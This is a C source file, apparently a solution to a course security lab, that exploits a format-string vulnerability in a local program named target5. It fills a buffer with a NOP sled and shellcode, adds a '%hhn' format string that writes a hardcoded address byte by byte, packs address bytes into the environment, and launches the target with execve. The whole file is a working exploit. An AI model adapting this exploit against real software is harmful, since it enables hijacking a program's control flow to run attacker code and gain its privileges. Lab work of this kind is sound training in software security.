#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"
#define BUFFER_SIZE 229
#define NOP 0x90

int main(void)
{
  	char *args[3];
  
  
  	char attack_buffer[BUFFER_SIZE];
  	
	int i;
	for (i = 0; i < 229; i++)
	{
		attack_buffer[i] = NOP;
	}
	
	for (i = 0; i < strlen(shellcode); i++)
        {
                attack_buffer[i] = shellcode[i];
        }
	
	/* 
	     0x40(64) -> 0x40a4fea8
	     0xa4(164) -> 0x40a4fea8
	     0xfa(249) -> 0x40a4fea8
	     0x90(400) -> 0x40a4fea8
	     by gdb inspecting there are 5 ptrs before the first ptr in formatString
	     formatString is 256 bytes(32 8byte word)
	     
	     last addr is equivalent to 37 param in sprintf
	     
	     64
	     164 - 64 = 100
	     249 - 164 = 85
	     400 - 249 = 151

	*/
	char attact_str [] = "%64x%37$hhn%100x%36$hhn%85x%35$hhn%151x%34$hhn";
	
	memcpy(&attack_buffer[60], attact_str, strlen(attact_str));
	
	memcpy(&attack_buffer[256 - 32], "\xa8\xfe\xa4\x40\x00", 5);

	args[0] = TARGET; 
	args[1] = attack_buffer; 
	args[2] = NULL;

	char *env[] = {
	    "\x00",
	    "\x00",
	    "\x00",
	    "\xa9\xfe\xa4\x40",
	    "\x00",
	    "\x00",
	    "\x00",
	    "\xaa\xfe\xa4\x40",
	    "\x00",
	    "\x00",
	    "\x00",
	    "\xab\xfe\xa4\x40",
	    "\x00",
	    "\x00",
	    "\x00",
	    NULL
	  };


	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}